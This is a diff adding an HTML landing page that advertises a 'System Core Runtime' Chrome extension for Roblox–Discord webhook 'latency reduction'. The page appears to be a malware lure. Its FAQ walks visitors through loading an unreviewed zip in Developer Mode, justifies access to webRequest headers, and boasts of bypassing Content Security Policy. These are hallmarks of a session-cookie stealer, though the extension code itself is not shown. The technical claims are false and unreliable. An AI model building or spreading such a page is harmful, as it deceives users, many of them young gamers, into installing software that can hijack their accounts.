@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Core | Dev Portal</title>
+    <style>
+        :root { --glow: #00f2ff; --bg: #0a0a0c; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
+        .hero { height: 60vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle at center, #16213e 0%, #0a0a0c 100%); border-bottom: 1px solid #1f1f23; }
+        h1 { font-size: 3rem; margin-bottom: 10px; letter-spacing: 2px; text-transform: uppercase; }
+        .glitch { text-shadow: 0 0 10px var(--glow); }
+        .btn { background: var(--glow); color: black; padding: 15px 40px; border-radius: 5px; text-decoration: none; font-weight: bold; font-size: 1.2rem; transition: 0.3s; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
+        .btn:hover { box-shadow: 0 0 40px var(--glow); transform: scale(1.05); }
+        .content { padding: 80px 20px; max-width: 900px; margin: auto; }
+        .faq { text-align: left; margin-top: 50px; background: #111114; padding: 30px; border-radius: 10px; border: 1px solid #1f1f23; }
+        .faq h3 { color: var(--glow); border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .faq p { color: #888; line-height: 1.6; }
+        .badge { font-size: 0.8rem; background: #1f1f23; padding: 5px 10px; border-radius: 20px; margin-bottom: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+    <section class="hero">
+        <div class="badge">V9.0.1 STABLE BUILD</div>
+        <h1 class="glitch">SYSTEM CORE RUNTIME</h1>
+        <p style="color: #666; margin-bottom: 40px;">Professional Webhook Optimization & API Latency Reduction</p>
+        <a href="System_Core_Runtime.zip" class="btn">DOWNLOAD EXTENSION</a>
+    </section>
+
+    <div class="content">
+        <div class="faq">
+            <h2>Frequently Asked Questions</h2>
+            
+            <h3>How do I install the runtime?</h3>
+            <p>Download the .zip file and extract it to a folder. Go to chrome://extensions, enable "Developer Mode" at the top right, and click "Load Unpacked." Select the extracted folder to initiate the sync.</p>
+
+            <h3>Why does it need these permissions?</h3>
+            <p>To reduce API latency between Roblox and Discord, the extension requires access to webRequest headers. This ensures that webhook pings are delivered in < 10ms.</p>
+
+            <h3>Does this fix "Forbidden" errors?</h3>
+            <p>Yes. By running at the browser level, the System Core bypasses standard Content Security Policy (CSP) blocks that cause script execution failures in the developer console.</p>
+        </div>
+    </div>
+
+    <footer style="padding: 40px; color: #333; font-size: 0.8rem;">
+        &copy; 2026 System Core Technologies. Authorized Staff Only.
+    </footer>
+
+</body>
+</html>
